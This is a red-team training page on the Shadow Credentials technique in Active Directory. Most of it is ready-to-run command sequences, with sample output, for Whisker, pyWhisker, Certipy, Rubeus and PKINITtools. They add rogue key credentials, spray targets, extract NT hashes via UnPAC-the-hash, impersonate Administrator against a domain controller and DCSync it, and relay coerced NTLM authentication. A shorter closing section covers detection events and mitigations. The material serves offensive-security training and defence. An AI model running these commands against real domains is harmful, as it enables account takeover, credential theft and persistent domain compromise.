---
layout: training-page
title: "Shadow Credentials — Red Team Academy"
module: "Active Directory"
tags:
  - shadow-credentials
  - msds-keycredentiallink
  - whisker
  - pywhisker
  - certipy
  - pkinit
  - unpac-the-hash
page_key: "ad-shadow-credentials"
render_with_liquid: false
---

# Shadow Credentials

Shadow Credentials abuse the `msDS-KeyCredentialLink` attribute — the same attribute Windows Hello for Business uses for passwordless authentication — to backdoor an account. Any principal with write access to this attribute on a target object can inject an attacker-controlled public key, then authenticate as that target via PKINIT (certificate-based Kerberos) without knowing their password. Access survives password resets.

## The msDS-KeyCredentialLink Attribute

Each value in `msDS-KeyCredentialLink` stores a serialized **Key Credential** structure containing a public key, creation timestamp, device GUID, and key usage flags. Under the WHfB Key Trust model, enrollment works as:

1. TPM generates an asymmetric key pair — private key never leaves the TPM
2. Public key is serialized and written to `msDS-KeyCredentialLink` by the Key Provisioning Server (Azure AD Connect or ADFS service account)
3. During logon, the user performs **PKINIT** — Kerberos pre-auth — signing a timestamp with the TPM key
4. KDC validates the signature against the stored public key in the attribute

No CA infrastructure required (unlike Certificate Trust). The absence of any enrollment integrity check is the attack surface: an attacker-written public key is indistinguishable from a legitimate one.

## Required Conditions

| Condition | Detail |
| --- | --- |
| **WriteProperty on msDS-KeyCredentialLink** | Comes from `GenericWrite`, `GenericAll`, or direct `WriteProperty` on the specific attribute. BloodHound edges: `GenericWrite`, `GenericAll`, `AddKeyCredentialLink`. |
| **PKINIT supported in domain** | At least one DC running Windows Server 2016+ with a Server Authentication certificate. Domain functional level 2016+. |

**Note:** Computer objects can self-write `msDS-KeyCredentialLink` when the attribute is currently empty — this enables the NTLM relay variant described below.

## Whisker (Windows / C#)

Whisker generates an RSA key pair, builds a Key Credential structure, writes it to the target via LDAP, and outputs a ready-to-use Rubeus command.

```
# List existing Key Credentials on target
Whisker.exe list /target:victimuser /domain:corp.local /dc:dc1.corp.local

# Add shadow credential — saves PFX to disk
Whisker.exe add /target:victimuser /domain:corp.local /dc:dc1.corp.local /path:C:\Temp\victim.pfx /password:P@ssw0rd1

# Add to computer account
Whisker.exe add /target:WORKSTATION01$ /domain:corp.local /dc:dc1.corp.local /path:C:\Temp\ws01.pfx /password:P@ssw0rd1

# Remove specific credential by Device ID
Whisker.exe remove /target:victimuser /domain:corp.local /dc:dc1.corp.local /deviceID:2de4643a-2e0b-438f-a99d-5cb058b3254b

# Clear ALL credentials (destructive — breaks WHfB enrollment)
Whisker.exe clear /target:victimuser /domain:corp.local /dc:dc1.corp.local
```

Whisker output (add) includes the Rubeus command directly — Whisker prints the **full** base64-encoded PFX inline; the shortened form below is for readability only. Copy the actual command from your Whisker output:

```
[*] KeyCredential generated with DeviceID 6fde5b51-a85b-473d-97e8-2c08b38e8c9f
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:victimuser /certificate:<BASE64_PFX_FROM_WHISKER> /password:"kR4tDHLs5X0u9Dk" /domain:corp.local /dc:dc1.corp.local /getcredentials /show /nowrap
```

## pyWhisker (Linux / Python)

Python equivalent of Whisker. Communicates directly with LDAP(S). Supports spray, export, and import actions in addition to the standard CRUD operations.

```
# List credentials
python3 pywhisker.py -d "corp.local" -u "attacker" -p "P@ssw0rd" \
  --target "victimuser" --action "list"

# Add shadow credential (PFX output)
python3 pywhisker.py -d "corp.local" -u "attacker" -p "P@ssw0rd" \
  --target "victimuser" --action "add" --filename victim_cred

# Add with PEM format (for PKINITtools)
python3 pywhisker.py -d "corp.local" -u "attacker" -p "P@ssw0rd" \
  --target "victimuser" --action "add" --filename victim_cred --export PEM

# Pass-the-hash authentication
python3 pywhisker.py -d "corp.local" -u "attacker" \
  -H aad3b435b51404eeaad3b435b51404ee:8846F7EAEE8FB117AD06BDD830B7586C \
  --target "victimuser" --action "add" --filename victim_cred

# Remove specific credential
python3 pywhisker.py -d "corp.local" -u "attacker" -p "P@ssw0rd" \
  --target "victimuser" --action "remove" \
  --device-id "a8ce856e-9b58-61f9-8fd3-b079689eb46e"

# Spray against a list of targets
python3 pywhisker.py -d "corp.local" -u "attacker" -p "P@ssw0rd" \
  --target-list targets.txt --action "spray"
```

pyWhisker output (add) includes the `gettgtpkinit.py` command for the next step:

```
[+] Saved PFX (#PKCS12) certificate & key at path: victim_cred.pfx
[*] Must be used with password: t4KMHamQHSnKCiSk
[*] A TGT can now be obtained with e.g.:
    gettgtpkinit.py -cert-pfx victim_cred.pfx -pfx-pass t4KMHamQHSnKCiSk corp.local/victimuser victim.ccache
```

## Certipy Shadow Workflow

Certipy's `shadow auto` command automates the complete lifecycle: add credential → PKINIT → UnPAC-the-hash → cleanup. The fastest path to an NT hash from a `GenericWrite` position.

```
# Full automated flow — adds credential, gets NT hash, cleans up
certipy shadow auto \
  -u 'attacker@corp.local' \
  -p 'P@ssw0rd!' \
  -dc-ip 10.0.0.100 \
  -account 'victimuser'

# Target a computer account (e.g., DC itself)
certipy shadow auto \
  -u 'attacker@corp.local' \
  -p 'P@ssw0rd!' \
  -dc-ip 10.0.0.100 \
  -account 'DC01$'

# Add without cleanup (persist access)
certipy shadow add \
  -u 'attacker@corp.local' \
  -p 'P@ssw0rd!' \
  -dc-ip 10.0.0.100 \
  -account 'victimuser'

# Authenticate from saved PFX and get NT hash
certipy auth \
  -pfx victimuser.pfx \
  -username victimuser \
  -domain corp.local \
  -dc-ip 10.0.0.100

# Manual cleanup
certipy shadow remove \
  -u 'attacker@corp.local' \
  -p 'P@ssw0rd!' \
  -dc-ip 10.0.0.100 \
  -account 'victimuser' \
  -device-id 'f4474290-e5a0-ea54-3858-82e68421a13d'
```

Expected `shadow auto` output:

```
[*] Adding Key Credential with device ID 'f4474290-e5a0-ea54-3858-82e68421a13d' to 'victimuser'
[*] Successfully added Key Credential
[*] Authenticating as 'victimuser' with the certificate
[*] Got TGT
[*] Saved credential cache to 'victimuser.ccache'
[*] Got hash for 'victimuser@corp.local': aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
[*] Restored the msDS-KeyCredentialLink attribute of the target to their original values
```

## UnPAC-the-Hash (PKINIT → NT Hash via U2U)

When PKINIT succeeds, the KDC embeds `PAC_CREDENTIAL_INFO` (containing the NT hash) in the TGT, encrypted with the AS-REP session key. To decrypt it, the attacker requests a User-to-User (U2U) service ticket — where the "service" is the same principal. The KDC encrypts the service ticket with the TGT session key, making the PAC decryptable.

### Windows (Rubeus) — included in Whisker output

```
# Save the Whisker-issued PFX to disk first, then point /certificate at it:
# [IO.File]::WriteAllBytes("C:\Windows\Temp\victim.pfx", [Convert]::FromBase64String("<BASE64_FROM_WHISKER>"))
Rubeus.exe asktgt /user:victimuser \
  /certificate:C:\Windows\Temp\victim.pfx \
  /password:"kR4tDHLs5X0u9Dk" \
  /domain:corp.local \
  /dc:dc1.corp.local \
  /getcredentials \
  /show \
  /nowrap
# /getcredentials triggers U2U → NTLM              :  fc525c9683e8fe067095ba2ddc971889
```

### Linux (PKINITtools)

```
# Install
pip install impacket
git clone https://github.com/dirkjanm/PKINITtools

# Step 1 — Get TGT, capture AS-REP key
python3 PKINITtools/gettgtpkinit.py \
  -cert-pfx victim_cred.pfx \
  -pfx-pass "t4KMHamQHSnKCiSk" \
  corp.local/victimuser victim.ccache
# Output: [+] AS-REP encryption key (you WILL need this later): 7a6f5c8b9d...

# Step 2 — Extract NT hash via U2U
export KRB5CCNAME=victim.ccache
python3 PKINITtools/getnthash.py \
  -key 7a6f5c8b9d4e2f1a0c3b8d7e6f5c4b3a \
  corp.local/victimuser
# Output: [+] Recovered NT Hash: fc525c9683e8fe067095ba2ddc971889
```

## RBCD Chain via Computer Account Shadow Credentials

When the attacker has `GenericWrite` on a **computer account** (not just a user), shadow credentials chain into S4U2self to impersonate Domain Admin against that machine.

```
# Step 1 — Add shadow credential to computer account
python3 pywhisker.py -d "corp.local" -u "attacker" -p "P@ssw0rd" \
  --target "DC01$" --action "add" --filename dc01_cred

# Step 2 — PKINIT to get TGT as DC01$
python3 PKINITtools/gettgtpkinit.py \
  -cert-pfx dc01_cred.pfx -pfx-pass "AutoGenPw!" \
  corp.local/"DC01$" dc01.ccache

export KRB5CCNAME=dc01.ccache

# Step 3 — S4U2self: impersonate Administrator to DC01$
python3 PKINITtools/gets4uticket.py \
  kerberos+ccache://corp.local\\DC01\$:dc01.ccache@dc1.corp.local \
  cifs/DC01.corp.local@corp.local \
  Administrator@corp.local \
  admin_dc01.ccache -v

# Step 4 — DCSync with the impersonation ticket
export KRB5CCNAME=admin_dc01.ccache
secretsdump.py -k -no-pass DC01.corp.local
```

### NTLM Relay Variant (no WriteProperty needed)

If coercion is possible (PrinterBug, PetitPotam, Coercer), relay to LDAPS with `--shadow-credentials` to add the attribute without any explicit write permission:

```
ntlmrelayx.py \
  -t ldaps://dc2.corp.local \
  --shadow-credentials \
  --shadow-target "DC01$"
```

## Detection

**Event ID 5136 — Directory Service Object Was Modified** is the primary signal. Key fields to alert on:

- `Attribute LDAP Display Name: msDS-KeyCredentialLink`
- `Operation Type: %%14675` (Value Added)
- `Subject Account Name` NOT in allowlist: `MSOL_*`, ADFS service account, `Key Admins`, `Enterprise Key Admins`

**Critical caveat:** Event 5136 for `msDS-KeyCredentialLink` on *user* objects is NOT logged by default. Enable attribute-level auditing via SACL using the attribute GUID `5b47d60f-6090-40b2-9f37-2a4de88f3063`:

```
$guid = [GUID]"5b47d60f-6090-40b2-9f37-2a4de88f3063"
$rule = New-Object System.DirectoryServices.ActiveDirectoryAuditRule(
    [System.Security.Principal.NTAccount]"Everyone",
    [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty,
    [System.Security.AccessControl.AuditFlags]::Success,
    $guid
)
$acl = Get-Acl "AD:CN=victimuser,CN=Users,DC=corp,DC=local"
$acl.AddAuditRule($rule)
Set-Acl "AD:CN=victimuser,CN=Users,DC=corp,DC=local" $acl
```

**Event ID 4769 with Enc_tkt_in_skey flag set** (U2U service ticket) is a specific UnPAC-the-hash indicator. Correlate: 5136 (attribute modified) → 4768 with certificate info → 4769 with Enc_tkt_in_skey = high confidence.

### Enumerate Existing Key Credentials (DSInternals)

```
Import-Module DSInternals
Get-ADReplAccount -All -Server dc1.corp.local |
  Where-Object { $_.KeyCredentials } |
  Select-Object DistinguishedName, KeyCredentials
```

## Mitigation

| Control | Action |
| --- | --- |
| **Deny ACE on privileged accounts** | Add explicit Deny on `WriteProperty` for `msDS-KeyCredentialLink` (GUID `5b47d60f-6090-40b2-9f37-2a4de88f3063`) for `EVERYONE` on Tier-0 accounts. Note: requires WS2016+ AD schema. |
| **Audit DACL misconfigurations** | BloodHound: query for `GenericWrite`, `GenericAll`, `AddKeyCredentialLink` edges to privileged objects. Remediate excess permissions. |
| **Periodic key baseline** | Alert on any `msDS-KeyCredentialLink` value whose `Source` field is `AD` (not `AzureAD`) for accounts in WHfB Key Trust environments. |
| **PKINIT restriction** | If WHfB/smart cards are not in use, do not deploy Server Authentication certs on DCs. No DC cert = no PKINIT. |

## Tool Reference

| Tool | Platform | Primary Use |
| --- | --- | --- |
| Whisker | Windows (.NET) | Add/remove Key Credentials, get Rubeus command |
| pyWhisker | Linux (Python) | Full CRUD on Key Credentials from Linux |
| Certipy | Linux (Python) | `shadow auto` — full automated exploitation |
| Rubeus | Windows (.NET) | PKINIT TGT request + U2U hash extraction |
| PKINITtools | Linux (Python) | `gettgtpkinit.py` + `getnthash.py` |
| DSInternals | PowerShell | Enumerate and audit Key Credentials at scale |
